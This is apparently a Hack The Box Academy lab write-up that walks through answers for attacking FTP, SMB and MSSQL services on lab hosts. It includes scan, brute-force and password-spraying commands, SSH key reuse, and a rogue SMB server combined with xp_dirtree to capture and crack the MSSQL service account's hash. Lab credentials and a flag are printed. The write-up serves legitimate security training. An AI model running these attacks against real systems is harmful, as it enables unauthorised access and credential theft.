![](https://academy.hackthebox.com/storage/modules/116/logo.png?t=1738467861)
# Attacking Common Services
Module Summary
Technology enables businesses to be productive using services that help employees be effective, and clients consume what a particular company has to offer. External and internal threats commonly target those services, including emails, websites, databases, file shares, and storage.

As we move forward in this field, we will need to get familiar with common services used by companies and the type of attacks we can execute against those services. Although attacks may be different for every kind of service, we usually pursue common objectives such as:

- The Concept of Attacks
- Finding Sensitive Information
- User Enumeration
- Validating Credentials
- Remote Code Execution
- Privilege Escalation


# Questions and Answers 
## Attacking FTP
* **What port is the FTP service running on?**
  
An initial Nmap scan was conducted using the following command: 
```bash
nmap -sC -sV --top-ports 1000 10.129.203.6
```
This scan, which utilizes default scripts (-sC) and service/version detection (-sV), did not return any open ports. To further investigate, a targeted scan was performed on a specific port range:
```bash
nmap -sC -sV -p 2000-3000 10.129.203.6
```
This scan revealed an FTP server running on port 2121. The absence of results in the initial scan suggests that the service was running on a non-standard port outside the top 1000 most common ports.


[![Screenshot-2025-02-25-120041.png](https://i.postimg.cc/wj4PPG9X/Screenshot-2025-02-25-120041.png)](https://postimg.cc/gxRNL4Xj)

* **What username is available for the FTP server?**

  As discussed in the lecture, misconfigurations can introduce security risks, particularly when services allow anonymous authentication. Certain services, such as FTP, can be configured to permit access without requiring credentials.

After identifying an FTP server running on port 2121 through Nmap scanning, an attempt was made to authenticate using anonymous login:
```bash
ftp -P 2121 anonymous@10.129.203.6
```
This resulted in successful access, confirming that the FTP server allows unauthenticated users to log in.

Then I proceeded to enumerate and download files from the FTP server.

[![Screenshot-2025-02-25-120041.png](https://i.postimg.cc/sDqH4Zmm/Screenshot-2025-02-25-120041.png)](https://postimg.cc/Whm72zQq)


After retrieving users.list and passwords.list from the FTP server, I performed a brute-force attack using Hydra:
```bash
hydra -L users.list -P passwords.list ftp://10.129.203.6:2121 -T 60
```
After executing the Hydra brute-force attack, the following valid FTP credentials were obtained:

* **Username:** robin
* **Password:** 7iz4rnckjsduza7

 [![Screenshot-2025-02-25-134635.png](https://i.postimg.cc/yYqxw7VP/Screenshot-2025-02-25-134635.png)](https://postimg.cc/Th9TbM5L)

 * **Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.**
Using the following command, we attempt to log in via SSH:

```bash
ssh robin@10.129.203.6
```
When prompted, enter the previously discovered password:
```bash
Password: 7iz4rnckjsduza7
```
After successfully logging into the system via SSH, I performed basic enumeration and found a file named flag.txt in the home directory.

[![Screenshot-2025-02-25-135413.png](https://i.postimg.cc/SKXpSzdz/Screenshot-2025-02-25-135413.png)](https://postimg.cc/PLk7KJBt)


# Attacking SMB

* **What is the name of the shared folder with READ permissions?**

To enumerate SMB shares on the target, I used smbmap with the following command:

```bash
smbmap -H 10.129.8.187
```
This provided the following output:

[![Screenshot-2025-02-25-134635.png](https://i.postimg.cc/BvX56JRz/Screenshot-2025-02-25-134635.png)](https://postimg.cc/kVPRYPJN)

**Answer:** GGJ

* **What is the password for the username "jason"?**
To answer this question, I leveraged CrackMapExec to test SMB authentication against the target system. The command used was:
```bash
crackmapexec smb 10.129.8.187 -u jason -p pws.list --local-auth
```
The output shows multiple failed login attempts, but eventually, a valid credential was discovered:

**Username:** jason
**Password:** 34c8zuNBo91!@28Bszh

This credential can now be used for further enumeration or privilege escalation within the target system.


[![Screenshot-2025-02-25-152630.png](https://i.postimg.cc/cC94rGpD/Screenshot-2025-02-25-152630.png)](https://postimg.cc/tn6HMwCP)


* **Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.**

Since we now have the correct username and password, we can attempt to SSH into the target system as the jason user. However, when we try, we encounter the following issue:

*jason@10.129.8.187: Permission denied (publickey).*

[![Screenshot-2025-02-25-153410.png](https://i.postimg.cc/6q7Ffs7b/Screenshot-2025-02-25-153410.png)](https://postimg.cc/XBb2nzk9)

While enumerating the SMB shares, I discovered an id_rsa key. To retrieve the key from the GGJ SMB share, I attempted to access it using the following command:

```bash
smbclient \\\\10.129.8.187\\GGJ -U jason
````

[![Screenshot-2025-02-25-154148.png](https://i.postimg.cc/X7LDB7DN/Screenshot-2025-02-25-154148.png)](https://postimg.cc/w7tkSHpn)

Next, I used the command:

```bash
chmod 600 id_rsa
````

After obtaining the id_rsa key, I used the following command to log in via SSH:

```bash
ssh -i id_rsa jason@10.129.8.187
````

I successfully logged into the Ubuntu system and found the flag.txt file. The contents of the file were:
**HTB{SMB_4TT4CKS_2349872359}**

[![Screenshot-2025-02-25-154804.png](https://i.postimg.cc/k5KQ8TXN/Screenshot-2025-02-25-154804.png)](https://postimg.cc/4K4HRbcn)

## Attacking SQL Databases

* *Authenticate to with user "htbdbuser" and password "MSSQLAccess01!"*


* **What is the password for the "mssqlsvc" user?**

  To begin, I performed an Nmap scan using the following command:

```bash 
nmap -sC -sV 10.129.80.163
```
The scan revealed that port 1433 was open, indicating the presence of Microsoft SQL Server 2019.

Next, I connected to the Microsoft SQL Server using the following command:
```bash
sqlcmd -S 10.129.80.163 -U htbdbuser -P MSSQLAccess01!
```
Once connected to the database, I enumerated the available databases by running the following command:
```bash
SELECT name FROM master.dbo.sysdatabases;
GO
```
The output revealed the following databases:
```bash
name
------------------------------------------------------------------
master
tempdb
model
msdb
hmaildb
flagDB
```
The presence of **flagDB** suggests it may contain the flag information.

I tried using the **flagDB** but got the following error message: 

```bash
1> USE flagDB
2> GO
Msg 916, Level 14, State 2, Server WIN-02\SQLEXPRESS, Line 1
The server principal "htbdbuser" is not able to access the database "flagDB" under the current security context.
```

I then tried checking for sysadmin privileges using the command:
```bash
1> SELECT IS_SRVROLEMEMBER('sysadmin');
2> GO
           
-----------
          0

(1 row affected)
```
The result was 0, so the user does not have sysadmin privileges.

In the lecture, you learned how to capture the MSSQL service hash. In the “Attacking SMB” section, we discussed setting up a fake SMB server to steal hashes and exploit default Windows implementations. So I attempted capturing the MSSQL service hash starting by creating a rogue SMB server with: 

```bash
impacket-smbserver SMBShare $(pwd) -smb2support
```

[![Screenshot-2025-02-26-094132.png](https://i.postimg.cc/hvmQwhxT/Screenshot-2025-02-26-094132.png)](https://postimg.cc/CnFKnhcx)


Now, I went back to the MSSQL session and execute it:
```bash
1> EXEC xp_dirtree '\\10.10.14.162\share';
2> GO
```

On the SMB server log we got a response from the MSSQL server

```bash
02/26/2025 08:45:46 AM: INFO: Incoming connection (10.129.80.163,49680)
02/26/2025 08:45:46 AM: INFO: AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
02/26/2025 08:45:46 AM: INFO: User WIN-02\mssqlsvc authenticated successfully
02/26/2025 08:45:46 AM: INFO: mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:42de48b66d93419793e4b2476ec7ae4a:01010000000000000049581e5d88db015b991005c475132500000000010010004a0056005600780077004c0069006f00030010004a0056005600780077004c0069006f000200100059005600780051005800630067006a000400100059005600780051005800630067006a00070008000049581e5d88db0106000400020000000800300030000000000000000000000000300000793650267307fee0832b294b8e754840595f9c72aa3ca1e4f14163b981a229e00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100360032000000000000000000
```

I copied the hash into a file and used John The Ripper to crack it: 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

[![Screenshot-2025-02-26-095259.png](https://i.postimg.cc/wvvhW60Q/Screenshot-2025-02-26-095259.png)](https://postimg.cc/xkwJ8SrX)

